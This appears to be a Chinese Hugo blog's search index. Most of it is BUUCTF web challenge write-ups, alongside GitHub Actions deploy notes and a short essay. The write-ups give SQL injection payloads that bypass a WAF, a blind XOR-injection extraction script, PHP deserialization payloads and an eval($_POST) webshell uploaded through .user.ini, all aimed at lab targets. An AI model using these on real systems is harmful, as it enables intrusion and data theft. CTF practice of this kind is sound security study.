除去personal_token之外，还可以使用public_key的方式进行action部署，有待尝试。 如果使用deploy_key的话，将yml文件对应内容进行修改。这种方式的好处在于密钥不会过期。 with:# personal_token: ${{ secrets.ACTIONS_ACCESS_TOKEN }} # 这里的 ACTIONS_DEPLOY_KEY 则是上面设置 Private Key的变量名deploy_key:${{ secrets.ACTIONS_DEPLOY_KEY }}external_repository:1iu2y/1iu2y.github.io# Pages 远程仓库 publish_dir:\"./public\"keep_files:false# remove existing filespublish_branch:master # deploying branchcommit_message:${{ github.event.head_commit.message }}#commit_message: ${{ github.event.head_commit.message }} ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:4","series":null,"tags":["github","github actions"],"title":"Github Actions 设置记录","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#it-works"},{"categories":["Hugo"],"content":"参考链接： https://zhuanlan.zhihu.com/p/109057290 ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:5","series":null,"tags":["github","github actions"],"title":"Github Actions 设置记录","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#参考链接"},{"categories":["CTF"],"content":"0x00 [极客大挑战 2019]BabySQL 题目链接 打开题目，还是熟悉的用户名密码注入界面 网站首页image-20210721115109030 \" 网站首页 首先判断闭合类型，用户名随便写，密码栏填个b'，发现报错，说明查询语句是单引号闭合。 报错信息1image-20210719170507319 \" 报错信息1 然后尝试一下密码b' or 1=1 #，发现报错信息中只有'1=1 #''。一开始我也不知道是怎么回事，查阅资料之后才知道，原来有的waf会对or、select等SQL语句关键字做过滤，比如直接替换为空，所以这题要使用双写绕过。 报错信息2image-20210719170705563 \" 报错信息2 试着使用union查询，输入b' ununionion seselectlect 1,2,3 #，显示成功登录信息，说明被查询的表的列数为3。 回显信息image-20210721115510406 \" 回显信息 接下来就是套路化的操作，精髓是使用information_schema等记录数据库自身信息的数据库，以及group_concat()函数。因为看到了2和3的回显，所以把2和3替换为其它表达式可以进行注入。 懒得放截图，直接把回显结果贴一下。 首先查看当前数据库 b' ununionion seselectlect 1,2,database() # Hello 2！ Your password is 'geek' 查看所有数据库 b' ununionion seselectlect 1,2,group_concat(schema_name)frfromom (infoorrmation_schema.schemata) # Hello 2！ Your password is 'information_schema,mysql,performance_schema,test,ctf,geek' 看到一个ctf库，再去爆这个数据库的表 b' ununionion seselectlect 1,2,group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=\"ctf\" # Hello 2！ Your password is 'Flag' 其中有个Flag表，然后再去爆字段 b' ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=\"Flag\" Hello 2！ Your password is 'flag' 其中有flag字段，再去爆数据 b' ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) 拿到flag Hello 2！ Your password is 'flag{b11bfeba-d864-4a0a-97f6-77e3ef266da9}' 个人感觉，这题的要点在于数据库本身信息数据库的内容，以及group_concat的使用，双写绕过其实是个很简单的东西。 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:1:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x00-极客大挑战-2019babysql"},{"categories":["CTF"],"content":"参考链接： information_schema数据库 group_concat()函数 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:1:1","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#参考链接"},{"categories":["CTF"],"content":"0x01 [极客大挑战 2019]HardSQL 题目链接 可以试出是单引号闭合，但是空格被过滤了，所以使用报错注入 防止github page build失败image-20210727113650753 \" 防止github page build失败 这题的主要知识点就是利用updatexml()和extractvalue()函数进行报错注入。使用concat()函数，再加上~或者@等能够引起路径参数报错的字符，将形如concat(0x7e, 语句, 0x7e)这样的结果作为参数，就能够得到XPATH syntax error: '回显结果'这样的报错信息，实现注入。 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:2:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x01-极客大挑战-2019hardsql"},{"categories":["CTF"],"content":"参考链接： https://blog.csdn.net/Xxy605/article/details/116999699 SQL报错注入攻击中的updatexml()函数 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:2:1","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#参考链接-1"},{"categories":["CTF"],"content":"0x02 [HCTF 2018]admin 题目链接 这是一道很有趣的题，网站提供了注册、登录、修改密码等功能。 看源码大致可以感觉到，需要你以admin身份登录，才能够获取flag，但是admin是已经注册过的用户，所以在不知道admin密码的情况下无法登录。 源码提示image-20210724184059694 \" 源码提示 查阅一些wp之后，可以得到3种解法。 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:3:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x02-hctf-2018admin"},{"categories":["CTF"],"content":"解法1：弱密码 这是很扯的一个解法，可以理解为，机缘巧合，直接试出来了admin的密码是123🤣，登录拿到flag ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:3:1","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#解法1弱密码"},{"categories":["CTF"],"content":"解法2：unicode欺骗 预期解之一。查看网页源码可以看到该web应用是一个flask应用，源码地址为https://github.com/woadsl1234/hctf_flask 改密码界面的源码注释提示image-20210724184719396 \" 改密码界面的源码注释提示 查看源码中的路由逻辑routes.py，其中的login与change路由处理逻辑使用了过时版本twisted框架中的nodeprep.prepare()函数，该函数会将ᴬ转换为A，然后转换为小写的a（这个知识点我也不知道获取的渠道是什么）。 @app.route('/login', methods = ['GET', 'POST']) def login(): if current_user.is_authenticated: return redirect(url_for('index')) form = LoginForm() if request.method == 'POST': name = strlower(form.username.data) //\u003c------就在这里使用了一个自定义的strlower()函数 session['name'] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash('Invalid username or password') return redirect(url_for('login')) login_user(user, remember=form.remember_me.data) return redirect(url_for('index')) return render_template('login.html', title = 'login', form = form) ... def strlower(username): username = nodeprep.prepare(username) return username 技巧 所以Unicode欺骗的做法就是先注册一个ᴬDMIN用户，然后修改密码。在注册与修改密码的过程中username会发生如下转变ᴬDMIN-\u003eAdmin-\u003eadmin，所以相当于能够控制admin用户的密码，然后就能够以admin用户的身份登录，获取flag。 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:3:2","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#解法2unicode欺骗"},{"categories":["CTF"],"content":"解法3： 修改flask session 那个web应用是个flask应用，flask是将session保存在本地的，并且没有做加密，而是仅仅进行了签名以防篡改，而搜索源代码可以看到其签名使用的密钥为ckj123。 import os class Config(object): SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123' SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test' SQLALCHEMY_TRACK_MODIFICATIONS = True 所以，我们可以用burp拦截普通用户登录后查看Index页面的请求，再使用flask session编解码工具解码拦截到的session，然后修改其中的用户ID，再重发请求，即可获得flag。 解码image-20210726171651090 \" 解码 将name改为admin，再进行签名。 重新签名image-20210726172004692 \" 重新签名 重发拿到flagimage-20210726171919586 \" 重发拿到flag ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:3:3","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#解法3-修改flask-session"},{"categories":["CTF"],"content":"参考链接： https://blog.csdn.net/mochu7777777/article/details/109302175 Unicode Character Table 客户端 session 导致的安全问题 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:3:4","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#参考链接-2"},{"categories":["CTF"],"content":"0x03 [BJDCTF2020]Easy MD5 题目链接 一道考察php中的md5()用法的题。 网站长这样 网站页面image-20210811221230795 \" 网站页面 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:4:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x03-bjdctf2020easy-md5"},{"categories":["CTF"],"content":"level1 首先随便输入，抓包得到hint提示 hint提示image-20210811221151702 \" hint提示 可以看到提交请求对应的语句为 select * from 'admin' where password=md5($pass,true) 这里要注入的话就得使md5($pass, true)值为' or 'xxx，也就是要找个字符串使其md5结果满足这一要求。遍历可以爆出结果，但其实有经验的话就知道\"ffifdyop\"满足上述需求，是md5注入时常用的字符串，其md5结果为' or '6xxxxx。 import hashlib s = \"ffifdyop\" m = hashlib.md5(s.encode()).hexdigest() print(m) plain = bytes.fromhex(m) print(plain) ================= 276f722736c95d99e921722cf9ed621c b\"'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c\" 放到上述语句就相当于 select * from 'admin' where password= '' or '6xxxxx' ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:4:1","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#level1"},{"categories":["CTF"],"content":"level2 注入通过之后，到了第二关 Do You Like MD5?image-20210811224151331 \" Do You Like MD5? 又可以看到提示，要求$a != $b 但是md5($a) == md5($b)。 第二个提示image-20210811224234490 \" 第二个提示 要满足前面的!=和后面的弱相等，存在两种情况： md5($a)与md5($b)结果以0e开头。php在处理这样的哈希字符串时会将其当作科学计数法，并且底数为0，所以结果都为0 $a与$b为数组。md5()无法处理数组输入，所以会返回null，这种情况也满足上述条件 具体内容可以参照这篇博客 所以，直接选两个不同的但是md5结果都以0e开头的字符串作为a b的值即可。 hackbarimage-20210812193547427 \" hackbar ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:4:2","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#level2"},{"categories":["CTF"],"content":"level3 第三关要求$_POST['param1']!==$_POST['param2']\u0026\u0026md5($_POST['param1'])===md5($_POST['param2']) 这里传入数组就可。除此之外，还可以找两个不同的但是md5结果相同的字符串，这理论上来说是存在的，但是我目前还没有查到现有的结果。hackbar发送Post请求image-20210812194016086 \" hackbar发送Post请求 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:4:3","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#level3"},{"categories":["CTF"],"content":"参考链接： CTF中常见php-MD5()函数漏洞 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:4:4","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#参考链接-3"},{"categories":["CTF"],"content":"0x04 [CISCN2019 华北赛区 Day2 Web1]Hack World 题目链接 首页image-20210813220634873 \" 首页 试一下就知道，or and union 等关键字都被过滤了，所以不能union注入或者报错注入。 以及输入1和2是可以看到正常的回显结果的 1：Hello, glzjin wants a girlfriend. 2：Do you want to be my girlfriend? google之后可以知道，还有一种注入叫做异或注入，这也是这题的考察点。 所以思路就是使用异或注入，逐位爆破flag的内容。 直接上脚本，注意每次请求之间加个sleep，不然会出错，因为请求之间间隔太短，导致收到的结果可能会顺序错乱。 import requests as rq import time host = 'http://ac7a6112-32f7-48c9-9088-66a935888686.node4.buuoj.cn:81/index.php' flag = \"\" payload = { \"id\": \"\" } for i in range(1, 50): # 二分查找很细节 a = 32 b = 128 m = (a + b) \u003e\u003e 1 while a \u003c b: payload[\"id\"] = \"0^(ascii(substr((select(flag)from(flag)),{0},1))\u003e{1})\".format(i, m) # print(payload[\"id\"]) se = rq.post(url=host, data=payload) # 请求发太快了容易出问题，所以这里的sleep是必须的 time.sleep(0.1) # 如果猜的数字更小 if \"Hello\" in se.text: a = m + 1 else: b = m m = (a + b) \u003e\u003e 1 # print(\"m: \", m, \"chr(m): \", chr(m)) if chr(m) == \" \": break flag += chr(m) print(flag) print(\"flag: \", flag) ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:5:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x04-ciscn2019-华北赛区-day2-web1hack-world"},{"categories":["CTF"],"content":"0x05 [网鼎杯 2020 青龙组]AreUSerialz 题目链接 这是一道反序列化的题，可以看到源码 \u003c?php include(\"flag.php\"); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-\u003eprocess(); } public function process() { if($this-\u003eop == \"1\") { $this-\u003ewrite(); } else if($this-\u003eop == \"2\") { $res = $this-\u003eread(); $this-\u003eoutput($res); } else { $this-\u003eoutput(\"Bad Hacker!\"); } } private function write() { if(isset($this-\u003efilename) \u0026\u0026 isset($this-\u003econtent)) { if(strlen((string)$this-\u003econtent) \u003e 100) { $this-\u003eoutput(\"Too long!\"); die(); } $res = file_put_contents($this-\u003efilename, $this-\u003econtent); if($res) $this-\u003eoutput(\"Successful!\"); else $this-\u003eoutput(\"Failed!\"); } else { $this-\u003eoutput(\"Failed!\"); } } private function read() { $res = \"\"; if(isset($this-\u003efilename)) { $res = file_get_contents($this-\u003efilename); } return $res; } private function output($s) { echo \"[Result]: \u003cbr\u003e\"; echo $s; } function __destruct() { if($this-\u003eop === \"2\") $this-\u003eop = \"1\"; $this-\u003econtent = \"\"; $this-\u003eprocess(); } } function is_valid($s) { for($i = 0; $i \u003c strlen($s); $i++) if(!(ord($s[$i]) \u003e= 32 \u0026\u0026 ord($s[$i]) \u003c= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } 定义了一个FileHandler类，并且会将接受到的$_GET['str']请求参数进行反序列化。 感觉应该是要反序列化得到FileHandler对象，然后通过__construct()或__destruct()魔术方法来读取flag.php的内容。 类的$op变量为1对应写操作，2对应读操作。 __construct()里面写死了$op=\"1\"，所以无法执行process()中的读取操作。 但是__destruct()里又会将$op从2变为1，所以需要想办法绕过这一逻辑。绕过的利用点就在于，这里使用的判断逻辑是强相等===，所以将$op定义为数字类型2，就可以绕过该判断，同时满足process()函数中的$op==\"2\"判断，因为这里是弱相等，存在自动类型转换。 需要注意的是： 方便起见，flag.php利用php的伪协议php://filter/read=convert.base64-encode=flag.php来读取 php对于private/protected类型的成员变量进行序列化时会加上包含00字节的特殊内容，但是这无法通过$is_valid()判断。可以将序列化结果中的s替换为S，使其后面的内容支持16进制，然后空字节写成\\00即可 Note: Object’s private members have the class name prepended to the member name; protected members have a ‘*’ prepended to the member name. These prepended values have null bytes on either side. https://www.php.net/manual/en/function.serialize ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x05-网鼎杯-2020-青龙组areuserialz"},{"categories":["CTF"],"content":"payload1 所以，最常规的payload可以通过以下方式生成： \u003c?php class FileHandler { protected $op = 2; protected $filename = \"flag.php\"; protected $content = \"\"; } $a = new FileHandler(); $b = serialize($a); $b = str_replace(\"s\", \"S\", $b); $b = str_replace(\"%00\", \"\\\\00\", $b); echo($b); ?\u003e 执行结果 O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\\00%2A\\00op%22%3Bi%3A2%3BS%3A11%3A%22\\00%2A\\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\\00%2A\\00content%22%3BS%3A0%3A%22%22%3B%7D 请求?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\\00%2A\\00op%22%3Bi%3A2%3BS%3A11%3A%22\\00%2A\\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\\00%2A\\00content%22%3BS%3A0%3A%22%22%3B%7D即可获取flag。 flagimage-20210824142159687 \" flag ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:1","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#payload1"},{"categories":["CTF"],"content":"payload2 还可以利用php的伪协议来获取flag.php文件的base64编码，然后再解码，也是一样的。 payload为 O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\\00%2A\\00op%22%3Bi%3A2%3BS%3A11%3A%22\\00%2A\\00filename%22%3BS%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3BS%3A10%3A%22\\00%2A\\00content%22%3BS%3A0%3A%22%22%3B%7D payload2image-20210824142639616 \" payload2 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:2","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#payload2"},{"categories":["CTF"],"content":"payload3 其实，网站信息中显示其使用的php版本为7.4.3，而7.1+版本的php在序列化与反序列化时对于private/protected是不敏感的，所以可以直接把上述的成员变量都当作public。 wappalyzer结果image-20210824142739850 \" wappalyzer结果 于是可以这样生成payload \u003c?php class FileHandler { public $op = 2; public $filename = \"php://filter/read=convert.base64-encode/resource=flag.php\"; public $content = \"\"; } $a = new FileHandler(); echo(serialize($a)); ?\u003e O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";s:7:\"content\";s:0:\"\";} 直接当作publicimage-20210824142956654 \" 直接当作public 同样可以拿到flag。 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:3","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#payload3"},{"categories":["CTF"],"content":"总结 这题的意义在于php的序列化与反序列化、序列化结果字段的含义、php7.1版本对于序列化反序列化操作的变化 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:4","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#总结"},{"categories":["CTF"],"content":"参考链接 PHP 序列化（serialize）格式详解 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:6:5","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#参考链接-4"},{"categories":["CTF"],"content":"0x06 [SUCTF 2019]CheckIn 题目链接 文件上传题 网站把php文件的常用后缀名都过滤了，并且把文件中的\u003c?内容也给过滤了。考虑用\u003cscript language='php'\u003e@eval($_POST[\"password\"]);\u003c/script\u003e的写法来绕过。 要知道，想利用webshell的话，必须要能够让服务端将你上传的文件当作php文件去解析，而这题过滤了php文件的后缀名，所以我们无法上传一个php文件，而只能上传一个含有php🐎的图片文件。 所以第二个问题就是怎么让服务端将我们上传的图片文件作为php文件去解析。在这种情况下，可以使用apache的.htaccess文件设置让服务端将某个文件当作php文件解析。但是这题环境是nginx，所以没有.htaccess。再查阅资料可知，.user.ini也是一个可以控制php设置的一个特殊文件。所以这题的思路是先上传.user.ini文件，设置在php文件中加载接下来要上传的图片文件，然后上传含有php🐎的图片文件。 两个文件内容 .user.ini GIF89a auto_prepend_file=zyleo.jpg zyleo.jpg GIF89a \u003cscript language='php'\u003e@eval($_POST[\"zyleo\"]);\u003c/script\u003e 上传之后，看到上传目录为uploads/fb....b2，其中也有index.php，这就是连接webshell的地址 uploadimage-20210824165341337 \" upload 然后蚁剑连接就行了 url地址：http://8d42f662-e446-4b96-afd8-ab3d2694bfa1.node4.buuoj.cn:81/uploads/fb10500f3a8407c9ec6ac288f25439b2/index.php 连接密码：zyleo Antswordimage-20210824165409582 \" Antsword ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:7:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x06-suctf-2019checkin"},{"categories":["CTF"],"content":"参考连接： htaccess文件上传拿shell user.ini文件构成的PHP后门 ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:7:1","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#参考连接"},{"categories":["CTF"],"content":"0x07 [GXYCTF2019]BabySQli 题目链接 这题两个输入框，试一下就可以发现，注入点是UserName。 UserName试了一下a' or 1=1#，页面返回Do not hack me，说明被过滤了。 再试a' union select 1,2#，返回Error: The used SELECT statements have a different number of columns。说明sql语句的查询结果不止2列，可以尝试出来是3列。 同时，用户名输admin，返回的是wrong pass，用户名输其他的返回的是wrong user，说明这题要满足的条件是用户名UserName为admin。同时a' union select 1,'admin',3#报的是wrong pass，说明username在查询结果的第二列。 查看网页源码，发现有search.php的提示信息，查看search.php，可以看到 \u003c!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /\u003e \u003ctitle\u003eDo you know who am I?\u003c/title\u003e wrong user! 上面的是base32编码，解码得到c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==，再经过base64解码得到该网站的sql查询语句select * from user where username = '$name'。 查询语句里没有密码字段，所以可以推测，密码字段应该是在后端被拿来对比了。同时再猜测（😂好吧其实是查阅博客，但是这些博客也没哪个讲清除了）是将我们的输入的值的md5与密码的md5结果相对比。 猜到这里就可以做了。使用union联合查询构造查询结果，就可以自己控制md5内容，然后再输入对应的密码内容即可。 payload： a' union select 1, 'admin', '900150983cd24fb0d6963f7d28e17f72'# abc flag{35de0117-ce39-40bd-8de4-40535e1a5274} ","date":"2021-07-19","objectID":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/:8:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 3","uri":"/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/#0x07-gxyctf2019babysqli"},{"categories":["文字"],"content":"开门见山，这个标题就是我这段时间感受最深的道理。 现代社会，由于技术的进步，我们总是很容易就获得短暂的快感：玩几盘lol、刷一刷抖音。这些活动在现代人的生活中真的是司空见惯。但是很多人并没有意识到一点，当一个人习惯于这种简单、廉价、易于获得的快乐时，ta会发现自己面对一些需要付诸努力与汗水才能获得成果的事情时，会很容易选择放弃。这是一个很简单的道理，就如“由俭入奢易，由奢入俭难”。 其实过去的我也时常沉溺于简单廉价的快乐之中。在处于获得廉价快乐的时间点时，确实很快乐，但是当这些事情结束之后，我时常会感到空虚，感觉虚度了光阴。久而久之，我开始对那些需要付出才能获得的长远性质的快乐渐渐失去耐心。“看一部电影好久啊，还不如直接玩几盘lol”、“看书还需要动脑子思考，不如玩几局lol，放松一下”。这些思考的场景确确实实在我的脑海中出现过。因此，我希望在接下来的生活里，逐渐减少这种廉价快乐的摄取。我开始减少自己玩lol的数量，即使想玩游戏也强迫自己去玩那些需要思考、有剧情的游戏。我开始用kindle安静地看书，并且强迫自己写下对于看过的书的思考与感悟。我也开始在每周为自己准备一部电影，看的时候认真看，试着从自己的角度思考电影想要传达的内容与思想。我甚至还开始坚持长跑，每次3km以上，强迫自己习惯于先流汗再获得成就感的过程。 幸运的是，这些事情确实改变了我的思维方式，并且之前沉溺于简单廉价快乐所给我带来的消极影响也没有到无法根除的地步。 有感而发，又写了一些水平很低的文字，惭愧惭愧。 愿能更加从容充实地度过自己的每一天。 ","date":"2021-06-29","objectID":"/2021-06-29-%E5%BF%AB%E4%B9%90%E6%9C%AC%E5%B0%B1%E4%B8%8D%E8%AF%A5%E5%BB%89%E4%BB%B7/:0:0","series":null,"tags":["Life"],"title":"快乐本就不该廉价","uri":"/2021-06-29-%E5%BF%AB%E4%B9%90%E6%9C%AC%E5%B0%B1%E4%B8%8D%E8%AF%A5%E5%BB%89%E4%BB%B7/#"},{"categories":["环境配置系列"],"content":"其实就是想记录一下正确设置GOPROXY的命令 ","date":"2021-06-24","objectID":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:0:0","series":null,"tags":["Golang"],"title":"Win10+go+vscode 环境配置","uri":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#"},{"categories":["环境配置系列"],"content":"0x00 Go环境安装 windows的go安装是十分简单的。直接去官网下载msi安装包，然后运行即可，环境变量、GOPATH什么的也不用自己配置，它会自动帮你弄好。如果是升级的话，还能自动卸载旧版本的go。 ","date":"2021-06-24","objectID":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["Golang"],"title":"Win10+go+vscode 环境配置","uri":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#0x00-go环境安装"},{"categories":["环境配置系列"],"content":"0x01 vscode环境配置 安装go插件 vscode的go插件go.png \" vscode的go插件 然后按照跳出来的提示，安装gopls/go-outline等一系列工具。正常情况下，go env可以看到，默认的GOPROXY为https://proxy.golang.org,direct，但是国内是无法访问的。于是解决办法来了，在不fq的情况下，执行命令go env -w GOPROXY=https://goproxy.cn,direct，然后再安装，就可以成功下载并安装这些工具。 于是，就可以在windows上使用vscode进行go开发了。 除此之外，windows还可以配合wsl配置linux上的go开发环境 ","date":"2021-06-24","objectID":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["Golang"],"title":"Win10+go+vscode 环境配置","uri":"/2021-06-24-win10govscode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#0x01-vscode环境配置"},{"categories":null,"content":"Something you may want to know about me: Interested in computer💻/programming👨‍💻/CTF🚩/basketball🏀/games🎮/movies📽️/reading📙 and so many other things … Undergraduate in SJTU (graduated in 2020.07) Postgraduate in SJTU (expected to graduate in 2023.03)👨‍🎓 My goal is to be a skilled security practitioner and developer🏃‍♂️ ","date":"2021-06-14","objectID":"/about/:0:1","series":null,"tags":null,"title":"关于我","uri":"/about/#something-you-may-want-to-know-about-me"},{"categories":["Hugo"],"content":"Hello World! ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:0:0","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#"},{"categories":["Hugo"],"content":"标题测试 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:0:0","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#标题测试"},{"categories":["Hugo"],"content":"二级标题 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:0","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#二级标题"},{"categories":["Hugo"],"content":"三级标题 四级标题 五级标题 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:1","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#三级标题"},{"categories":["Hugo"],"content":"三级标题 四级标题 五级标题 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:1","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#四级标题"},{"categories":["Hugo"],"content":"三级标题 四级标题 五级标题 ","date":"2021-06-14","objectID":"/2021-06-14-hugo-hello-world/:1:1","series":null,"tags":["test","hello"],"title":"hugo: hello world","uri":"/2021-06-14-hugo-hello-world/#五级标题"},{"categories":["Hugo"],"content":"代码块 def main(): print(\"hello world\") 行内代码块code 